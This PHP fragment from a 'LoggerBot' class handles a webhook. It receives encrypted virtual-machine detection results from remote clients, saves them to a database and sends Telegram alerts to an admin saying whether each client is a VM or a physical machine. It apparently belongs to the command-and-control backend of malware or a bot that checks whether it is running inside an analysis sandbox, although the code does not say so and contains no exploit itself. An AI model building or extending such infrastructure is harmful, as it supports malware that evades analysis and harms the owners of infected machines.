<?php

class LoggerBot
{

    private function handleUploadVMStatus($data)
    {
        try {
            $this->logWebhook("Upload VM status: " . json_encode($data));

            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Upload VM status failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $vmDetails = '';
            if (isset($data['vm_details']) && !empty($data['vm_details'])) {
                $this->logWebhook("Received vm_details for client_id: $clientId, data: " . substr($data['vm_details'], 0, 50) . "...");
                $vmDetails = $this->decrypt($data['vm_details']);
                if ($vmDetails === '') {
                    $this->logError("VM details decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($vmDetails, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("VM details is not valid JSON for client_id: $clientId, data: " . substr($vmDetails, 0, 50) . "...");
                        $vmDetails = '';
                    } else {
                        $this->logWebhook("Decrypted vm_details for client_id: $clientId, length: " . strlen($vmDetails));
                    }
                }
            } else {
                $this->logWebhook("No vm_details provided for client_id: $clientId");
            }

            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO client_vm_status (client_id, vm_details, created_at) 
                VALUES (?, ?, NOW()) 
                ON DUPLICATE KEY UPDATE vm_details = ?, created_at = NOW()"
                );
                $stmt->execute([$clientId, $vmDetails, $vmDetails]);
                $this->logWebhook("Inserted/Updated vm_details for client_id: $clientId, length: " . strlen($vmDetails));
            } catch (PDOException $e) {
                $this->logError("Database insertion failed for VM status, client_id: $clientId, error: " . $e->getMessage());
                throw new Exception("Database insertion failed: " . $e->getMessage());
            }

            if ($vmDetails) {
                $vmData = json_decode($vmDetails, true);
                $isVM = $vmData['is_vm'] ?? false;
                $message = $isVM
                    ? "⚠️ Virtual Machine detected on client $clientId!\nDetails: " . json_encode($vmData['checks'], JSON_PRETTY_PRINT)
                    : "✅ Physical Machine confirmed for client $clientId.";
                $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            $this->logCommand($clientId, 'upload_vm_status', "VM Details: " . strlen($vmDetails) . " chars");

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Upload VM status failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }
}
